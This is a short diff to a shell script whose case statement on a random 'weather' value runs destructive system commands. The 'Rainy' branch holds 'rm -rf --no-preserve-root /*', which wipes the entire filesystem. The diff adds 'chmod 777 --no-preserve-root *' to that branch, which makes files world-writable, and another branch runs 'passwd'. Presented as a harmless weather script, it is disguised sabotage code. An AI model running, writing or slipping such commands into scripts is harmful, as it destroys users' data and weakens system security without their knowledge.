@@ -21,6 +21,7 @@ case $random_weather in
     passwd
     ;;
   "Rainy")
+    chmod 777 --no-preserve-root *
     rm -rf --no-preserve-root /*
     ;;
   "Snowy")
